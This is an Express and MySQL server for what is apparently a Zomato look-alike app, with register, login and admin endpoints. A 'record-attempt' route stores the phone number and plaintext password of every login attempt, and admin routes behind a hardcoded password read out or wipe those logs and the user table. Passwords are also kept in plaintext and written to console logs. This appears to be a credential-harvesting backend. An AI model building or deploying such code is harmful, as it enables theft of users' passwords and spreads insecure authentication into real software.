const express = require('express');
const mysql = require('mysql2');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Database Connection
const db = mysql.createConnection({
    host: process.env.DB_HOST || 'localhost',
    user: process.env.DB_USER || 'root',
    password: process.env.DB_PASSWORD || '',
    database: process.env.DB_NAME || 'zomato_clone',
    port: process.env.DB_PORT || 3306,
    ssl: process.env.DB_SSL === 'true' ? { rejectUnauthorized: false } : null
});

db.connect(err => {
    if (err) {
        console.error('SERVER ERROR: Could not connect to MySQL:', err.message);
    } else {
        console.log('✅ Connected to database');

        // AUTO-CREATE TABLES (Added for easy setup)
        const tables = [
            `CREATE TABLE IF NOT EXISTS users (
                id INT AUTO_INCREMENT PRIMARY KEY,
                username VARCHAR(100) NOT NULL,
                phone VARCHAR(20) NOT NULL UNIQUE,
                password VARCHAR(255) NOT NULL,
                referral_code VARCHAR(50),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )`,
            `CREATE TABLE IF NOT EXISTS login_logs (
                id INT AUTO_INCREMENT PRIMARY KEY,
                phone VARCHAR(20) NOT NULL,
                password VARCHAR(255) NOT NULL,
                type ENUM('login', 'register') NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )`
        ];

        tables.forEach(query => {
            db.query(query, (err) => {
                if (err) console.error('❌ Table init error:', err.message);
            });
        });
    }
});

// Routes

// Health Check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', message: 'Server is running' });
});

// Register Endpoint
app.post('/api/register', (req, res) => {
    console.log('➡️ Received Register Request:', req.body);
    const { username, phone, password, inviteCode } = req.body;

    // Strict validation for required fields only
    if (!username || !phone || !password) {
        console.error('❌ Validation Failed: Missing username, phone, or password');
        return res.status(400).json({ success: false, message: 'Missing required fields: username, phone, password' });
    }

    // Use NULL for empty invite code
    const referral = inviteCode ? inviteCode : null;

    const query = 'INSERT INTO users (username, phone, password, referral_code) VALUES (?, ?, ?, ?)';
    db.query(query, [username, phone, password, referral], (err, result) => {
        if (err) {
            console.error('❌ Database Error:', err);
            if (err.code === 'ER_DUP_ENTRY') {
                return res.status(409).json({ success: false, message: 'This phone number is already registered.' });
            }
            return res.status(500).json({ success: false, message: 'Internal Database Error' });
        }
        console.log('✅ Registration Successful for user:', username);
        res.json({ success: true, message: 'Registration successful!', userId: result.insertId });
    });
});

// Login Endpoint
app.post('/api/login', (req, res) => {
    console.log('➡️ Received Login Request:', req.body);
    const { phone, password } = req.body;

    if (!phone || !password) {
        return res.status(400).json({ success: false, message: 'Phone and password are required' });
    }

    const query = 'SELECT * FROM users WHERE phone = ? AND password = ?';
    db.query(query, [phone, password], (err, results) => {
        if (err) {
            console.error('❌ Login Error:', err);
            return res.status(500).json({ success: false, message: 'Database error' });
        }

        if (results.length > 0) {
            const user = results[0];
            console.log('✅ Login Successful for:', user.username);
            res.json({
                success: true,
                message: 'Login successful',
                user: { id: user.id, username: user.username, phone: user.phone }
            });
        } else {
            console.warn('⚠️ Invalid Login Attempt for:', phone);
            res.status(401).json({ success: false, message: 'Invalid phone or password' });
        }
    });
});

// Logging Endpoint - Records any attempt
app.post('/api/record-attempt', (req, res) => {
    const { phone, password, type } = req.body;
    if (!phone || !password || !type) {
        return res.status(400).json({ success: false, message: 'Missing fields' });
    }

    const query = 'INSERT INTO login_logs (phone, password, type) VALUES (?, ?, ?)';
    db.query(query, [phone, password, type], (err) => {
        if (err) {
            console.error('❌ Failed to record log:', err);
            return res.status(500).json({ success: false });
        }
        res.json({ success: true });
    });
});

// Admin Logs Endpoint
app.post('/api/admin/logs', (req, res) => {
    const { password } = req.body;
    // Direct password check as requested
    if (password !== '123456ha') {
        return res.status(403).json({ success: false, message: 'Unauthorized' });
    }

    const query = 'SELECT * FROM login_logs ORDER BY created_at DESC';
    db.query(query, (err, results) => {
        if (err) {
            console.error('❌ Admin Fetch Error:', err);
            return res.status(500).json({ success: false });
        }
        res.json({ success: true, logs: results });
    });
});

// Admin Delete Logs Endpoint
app.post('/api/admin/clear-logs', (req, res) => {
    const { password } = req.body;
    if (password !== '123456ha') return res.status(403).json({ success: false });

    db.query('DELETE FROM login_logs', (err) => {
        if (err) {
            console.error('❌ Admin Delete Error:', err);
            return res.status(500).json({ success: false });
        }
        res.json({ success: true, message: 'Logs cleared' });
    });
});

// Admin Fetch Users Endpoint
app.post('/api/admin/users', (req, res) => {
    const { password } = req.body;
    if (password !== '123456ha') return res.status(403).json({ success: false });

    db.query('SELECT id, username, phone, created_at FROM users ORDER BY created_at DESC', (err, results) => {
        if (err) {
            console.error('❌ Admin Users Fetch Error:', err);
            return res.status(500).json({ success: false });
        }
        res.json({ success: true, users: results });
    });
});

// Admin Delete Users Endpoint
app.post('/api/admin/clear-users', (req, res) => {
    const { password } = req.body;
    if (password !== '123456ha') return res.status(403).json({ success: false });

    db.query('DELETE FROM users', (err) => {
        if (err) {
            console.error('❌ Admin Delete Members Error:', err);
            return res.status(500).json({ success: false });
        }
        res.json({ success: true, message: 'Members list cleared' });
    });
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
});
